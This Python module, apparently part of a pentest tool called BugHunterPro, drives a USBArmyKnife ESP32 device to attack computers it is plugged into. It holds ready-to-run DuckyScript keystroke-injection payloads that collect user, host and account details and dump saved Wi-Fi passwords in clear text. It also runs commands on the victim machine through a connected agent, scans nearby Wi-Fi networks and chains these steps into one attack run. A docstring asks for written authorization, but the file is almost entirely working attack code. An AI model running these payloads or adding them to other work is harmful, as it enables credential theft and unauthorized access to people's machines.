#!/usr/bin/env python3
"""
USBArmyKnife integration module for BugHunterPro.

Communicates with a USBArmyKnife ESP32 device over its unauthenticated HTTP API
(default: http://4.3.2.1:8080).  All use requires explicit written authorization
from the target owner.

API reference: https://github.com/i-am-shodan/USBArmyKnife/wiki/Commands
"""

import textwrap
import time
from pathlib import Path

import requests

from BugHunterPro import M, info, success, warn, error, vuln, section

DEFAULT_HOST = "4.3.2.1"
DEFAULT_PORT = 8080

# ── DuckyScript payload library ──────────────────────────────────────────────
PAYLOADS = {
    "recon_windows": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 2000
        GUI r
        DELAY 600
        STRING cmd /c "whoami & hostname & ipconfig /all & net user & systeminfo" > %TEMP%\\bhp_recon.txt
        ENTER
        DELAY 1000
        GUI r
        DELAY 600
        STRING notepad %TEMP%\\bhp_recon.txt
        ENTER
    """),

    "recon_linux": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 1000
        CTRL-ALT t
        DELAY 1500
        STRING whoami; hostname; ip addr; id; cat /etc/passwd | cut -d: -f1; uname -a | tee /tmp/bhp_recon.txt
        ENTER
    """),

    "wifi_creds_windows": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 2000
        GUI r
        DELAY 600
        STRING cmd /c "for /f tokens=2delims=: %i in ('netsh wlan show profiles ^| findstr Profile') do @netsh wlan show profile name=%i key=clear" > %TEMP%\\bhp_wifi.txt
        ENTER
    """),

    "lock_screen": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 500
        GUI l
    """),

    "mouse_jiggle": textwrap.dedent("""\
        ATTACKMODE HID
        MOUSE_JIGGLE
    """),

    "open_terminal_linux": textwrap.dedent("""\
        ATTACKMODE HID
        DELAY 1000
        CTRL-ALT t
    """),
}

# ── Marauder command aliases ──────────────────────────────────────────────────
MARAUDER = {
    "scan_ap":       "scanaps",
    "scan_stations": "scansta",
    "scan_ble":      "scanble",
    "stop_scan":     "stopscan",
    "list_aps":      "listaps",
    "list_stations": "liststa",
}


# ── Low-level HTTP client ─────────────────────────────────────────────────────
class USBArmyKnifeClient:
    """
    Thin wrapper around USBArmyKnife's HTTP API.
    Port 8080, no authentication required.
    All control endpoints return an HTTP redirect to /index.html on success.
    """

    def __init__(self, host=DEFAULT_HOST, port=DEFAULT_PORT, timeout=10):
        self.base = f"http://{host}:{port}"
        self.timeout = timeout
        self._s = requests.Session()
        self._s.headers["User-Agent"] = "BugHunterPro/1.0"

    def _get(self, path, params=None):
        return self._s.get(
            f"{self.base}{path}", params=params,
            timeout=self.timeout, allow_redirects=True,
        )

    # Status ------------------------------------------------------------------
    def status(self):
        """GET /data.json → full device state dict."""
        return self._get("/data.json").json()

    def capabilities(self):
        return self.status().get("capabilities", [])

    def is_agent_connected(self):
        return bool(self.status().get("agentConnected", False))

    def list_files(self):
        return self.status().get("fileListing", [])

    def get_logs(self):
        return self.status().get("logMessages", [])

    # File management ---------------------------------------------------------
    def upload(self, filename, content):
        """POST /uploadFile (multipart/form-data)."""
        data = content.encode() if isinstance(content, str) else content
        resp = self._s.post(
            f"{self.base}/uploadFile",
            files={"file": (filename, data, "text/plain")},
            timeout=self.timeout,
        )
        resp.raise_for_status()
        return resp.status_code == 200

    def download(self, filename):
        """GET /downloadFile?filename=<name> → raw bytes."""
        return self._get("/downloadFile", {"filename": filename}).content

    def delete(self, filename):
        """GET /delete?filename=<name>."""
        self._get("/delete", {"filename": filename})

    def clear_logs(self):
        """GET /clearlogs."""
        self._get("/clearlogs")

    # Execution ---------------------------------------------------------------
    def run_file(self, filename):
        """GET /runfile?filename=<name> — execute a DuckyScript file on SD."""
        self._get("/runfile", {"filename": filename})

    def run_raw(self, command):
        """GET /rawinput?rawCommand=<cmd> — run a single DuckyScript line."""
        self._get("/rawinput", {"rawCommand": command})

    def agent_exec(self, command):
        """GET /runagentcmd?rawCommand=<cmd> — run command via connected agent."""
        self._get("/runagentcmd", {"rawCommand": command})

    # Marauder ----------------------------------------------------------------
    def marauder(self, command):
        """GET /marauder?marauderCmd=<cmd> — run ESP32 Marauder command."""
        self._get("/marauder", {"marauderCmd": command})

    # Settings / misc ---------------------------------------------------------
    def set_setting(self, name, value):
        """GET /set?name=<n>&value=<v>."""
        self._get("/set", {"name": name, "value": str(value)})

    def mic(self, enabled):
        """GET /mic?enabled=<true|false>."""
        self._get("/mic", {"enabled": "true" if enabled else "false"})


# ── High-level attack module ──────────────────────────────────────────────────
class USBAttackModule:
    """
    Orchestrates USBArmyKnife device actions within a BugHunterPro scan.

    Usage (standalone)::

        mod = USBAttackModule(host="4.3.2.1")
        results = mod.run_full(payloads=["recon_windows"], wifi_recon=True)

    Usage (integrated via BugHunterPro --usb-host)::

        hunter = BugHunterPro("example.com", usb_host="4.3.2.1")
        results = hunter.hunt()   # USB results merged into report
    """

    def __init__(self, host=DEFAULT_HOST, port=DEFAULT_PORT):
        self.client = USBArmyKnifeClient(host, port)
        self.host = host
        self.port = port
        self.results = {
            "device":        {},
            "wifi_aps":      [],
            "agent_output":  [],
            "payloads_run":  [],
            "findings":      [],
        }

    # ── Lifecycle ────────────────────────────────────────────────────────────
    def connect(self):
        """Verify device is reachable and populate device fingerprint."""
        section(f"USB Attack Module — {self.host}:{self.port}")
        try:
            st = self.client.status()
        except Exception as exc:
            error(f"Cannot reach USBArmyKnife at {self.host}:{self.port} — {exc}")
            return False

        self.results["device"] = {
            "version":        st.get("version", "unknown"),
            "chipModel":      st.get("chipModel", "unknown"),
            "numCores":       st.get("numCores", 0),
            "freeHeap":       st.get("freeHeap", 0),
            "heapUsagePc":    st.get("heapUsagePc", 0),
            "uptime":         st.get("uptime", ""),
            "USBmode":        st.get("USBmode", ""),
            "capabilities":   st.get("capabilities", []),
            "agentConnected": st.get("agentConnected", False),
            "machineName":    st.get("machineName", ""),
            "sdCardPct":      st.get("sdCardPercentFull", 0),
        }
        d = self.results["device"]
        success(f"Connected — {d['chipModel']}  fw {d['version']}  uptime {d['uptime']}")
        info(f"Capabilities : {', '.join(d['capabilities']) or 'none'}")
        info(f"USB mode     : {d['USBmode']}  |  Agent: {'yes' if d['agentConnected'] else 'no'}")
        if d["machineName"]:
            vuln(f"Target machine visible via agent: {d['machineName']}")
        return True

    # ── WiFi recon ───────────────────────────────────────────────────────────
    def wifi_recon(self, scan_duration=15):
        """Trigger Marauder AP scan and collect results from device logs."""
        caps = self.results["device"].get("capabilities", [])
        if "MARAUDER" not in caps:
            warn("Device has no MARAUDER capability — skipping WiFi recon")
            return []

        section("WiFi Recon (Marauder)")
        self.client.clear_logs()
        info(f"AP scan running for {scan_duration}s…")
        self.client.marauder(MARAUDER["scan_ap"])
        time.sleep(scan_duration)
        self.client.marauder(MARAUDER["stop_scan"])
        time.sleep(2)

        aps = []
        for entry in self.client.get_logs():
            text = str(entry).strip()
            if any(kw in text for kw in ("BSSID", "ESSID", "Ch:", "RSSI", "AP:")):
                aps.append(text)

        if aps:
            success(f"Captured {len(aps)} AP record(s)")
            for ap in aps[:10]:
                info(f"  {M.GRAY}{ap}")
            self.results["wifi_aps"] = aps
            self.results["findings"].append({
                "type":     "WiFi Network Exposure",
                "severity": "Info",
                "detail":   f"{len(aps)} nearby APs enumerated via Marauder scan",
                "evidence": aps[:5],
            })
        else:
            warn("No AP records in logs — try a longer scan_duration")

        return aps

    # ── Payload delivery ──────────────────────────────────────────────────────
    def run_payload(self, payload_name, wait=5):
        """Upload and execute a named payload from the built-in library."""
        if payload_name not in PAYLOADS:
            error(f"Unknown payload '{payload_name}'.  Available: {list(PAYLOADS)}")
            return False

        section(f"HID Payload — {payload_name}")
        filename = f"bhp_{payload_name}.txt"
        info(f"Uploading '{filename}'…")
        self.client.upload(filename, PAYLOADS[payload_name])
        success("Uploaded")
        info("Executing…")
        self.client.run_file(filename)
        time.sleep(wait)
        self.results["payloads_run"].append(payload_name)
        success(f"Payload '{payload_name}' dispatched")
        return True

    def run_custom_payload(self, filename, script, wait=5):
        """Upload and execute a custom DuckyScript string."""
        section(f"Custom Payload — {filename}")
        info(f"Uploading '{filename}'…")
        self.client.upload(filename, script)
        time.sleep(0.5)
        self.client.run_file(filename)
        time.sleep(wait)
        self.results["payloads_run"].append(filename)
        success("Dispatched")

    # ── Agent recon ───────────────────────────────────────────────────────────
    def agent_recon(self):
        """Run reconnaissance commands via the connected victim-side agent."""
        section("Agent Recon")
        if not self.client.is_agent_connected():
            warn("Agent not connected — skipping agent recon")
            return []

        commands = [
            ("whoami",        "Current user"),
            ("hostname",      "Machine hostname"),
            ("ipconfig /all", "Network config"),
            ("net user",      "Local accounts"),
        ]
        self.client.clear_logs()
        for cmd, label in commands:
            info(f"Executing via agent: {label}")
            self.client.agent_exec(cmd)
            time.sleep(2)

        output = [str(e).strip() for e in self.client.get_logs()]
        if output:
            success(f"Captured {len(output)} output line(s)")
            self.results["agent_output"] = output
            self.results["findings"].append({
                "type":     "Remote Agent Code Execution",
                "severity": "Critical",
                "detail":   "Agent command execution confirmed on target machine",
                "evidence": output[:10],
            })
        return output

    # ── File dump ────────────────────────────────────────────────────────────
    def dump_device_files(self, dest_dir="."):
        """Download every file from the device SD card."""
        section("Device File Dump")
        files = self.client.list_files()
        if not files:
            warn("No files found on device")
            return []

        dest = Path(dest_dir)
        saved = []
        for filename in files:
            try:
                data = self.client.download(filename)
                out = dest / Path(filename).name
                out.write_bytes(data)
                success(f"Saved: {out}  ({len(data)} bytes)")
                saved.append(str(out))
            except Exception as exc:
                error(f"Download failed for '{filename}': {exc}")

        return saved

    # ── Full chain ───────────────────────────────────────────────────────────
    def run_full(self, payloads=None, wifi_recon=True, agent_recon=True,
                 wifi_scan_duration=15):
        """
        Run the complete USB attack chain and return results dict:

        1. Connect & fingerprint device
        2. WiFi AP/station recon via Marauder  (if wifi_recon=True)
        3. Execute each payload in `payloads`  (list of payload names)
        4. Agent command recon                 (if agent_recon=True)

        Returns self.results suitable for merging into a BugHunterPro report.
        """
        if not self.connect():
            return self.results

        if wifi_recon:
            self.wifi_recon(scan_duration=wifi_scan_duration)

        for name in (payloads or []):
            self.run_payload(name)

        if agent_recon:
            self.agent_recon()

        return self.results


# ── CLI entry point (standalone) ─────────────────────────────────────────────
def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="USBArmyKnife module for BugHunterPro — authorized use only",
    )
    parser.add_argument("--host",    default=DEFAULT_HOST, help="Device IP (default: 4.3.2.1)")
    parser.add_argument("--port",    default=DEFAULT_PORT, type=int)
    parser.add_argument("--payload", nargs="*", default=[],
                        help=f"Payload(s) to run: {list(PAYLOADS)}")
    parser.add_argument("--wifi",    action="store_true",  help="Run Marauder WiFi recon")
    parser.add_argument("--agent",   action="store_true",  help="Run agent recon commands")
    parser.add_argument("--dump",    action="store_true",  help="Dump SD card files locally")
    parser.add_argument("--wifi-duration", type=int, default=15,
                        help="WiFi scan duration in seconds (default: 15)")
    args = parser.parse_args()

    mod = USBAttackModule(args.host, args.port)
    results = mod.run_full(
        payloads=args.payload,
        wifi_recon=args.wifi,
        agent_recon=args.agent,
        wifi_scan_duration=args.wifi_duration,
    )

    if args.dump:
        mod.dump_device_files()

    import json
    print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
